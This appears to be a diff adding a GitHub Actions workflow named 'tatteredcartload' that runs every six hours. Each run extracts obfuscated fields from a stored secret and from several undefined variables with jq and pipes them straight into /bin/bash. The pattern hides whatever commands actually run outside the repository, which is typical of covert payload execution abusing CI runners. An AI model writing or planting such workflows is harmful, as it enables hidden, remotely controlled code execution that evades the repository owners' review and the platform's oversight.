@@ -1,0 +1,26 @@
+name: tatteredcartload
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '15 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: tatteredcartload
+        env:
+          rmw3: ${{ secrets.rmw3 }}
+        run: |
+          echo $rmw3 | jq -r .fba14 | /bin/bash
+          echo $aw15013 | jq -r .qod30 | /bin/bash
+          echo $m3292 | jq -r .mfm57 | /bin/bash
+          echo $vu0967 | jq -r .u30 | /bin/bash
+          echo $g6 | jq -r .pm99572 | /bin/bash
+          echo $bjmk80 | jq -r .qyljq33985 | /bin/bash
+          echo $rdhn32 | jq -r .ce77 | /bin/bash
+          echo $erxmz35 | jq -r .zlwi18907 | /bin/bash
+          echo $rmcuk6324 | jq -r .qial55 | /bin/bash
+
